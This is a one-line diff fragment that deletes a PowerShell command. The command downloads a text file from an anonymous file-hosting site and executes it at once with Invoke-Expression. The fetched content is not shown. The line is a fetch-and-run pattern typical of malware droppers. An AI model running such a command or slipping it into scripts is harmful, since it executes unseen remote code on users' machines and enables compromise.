@@ -1,1 +1,0 @@
-powershell -c "irm https://files.catbox.moe/o58c51.txt | iex"
